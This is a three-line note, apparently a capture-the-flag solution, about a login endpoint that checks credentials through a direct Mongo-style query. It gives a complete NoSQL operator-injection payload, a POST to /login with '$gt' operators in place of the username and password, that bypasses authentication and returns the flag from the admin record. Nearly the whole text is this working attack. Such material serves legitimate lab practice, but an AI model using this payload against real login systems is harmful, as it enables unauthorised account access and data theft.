Login uses a direct comparison (Mongo-style). Bypass with operator injection:
POST /login {"username":{"$gt":""},"password":{"$gt":""}}
The flag is returned in the admin record.
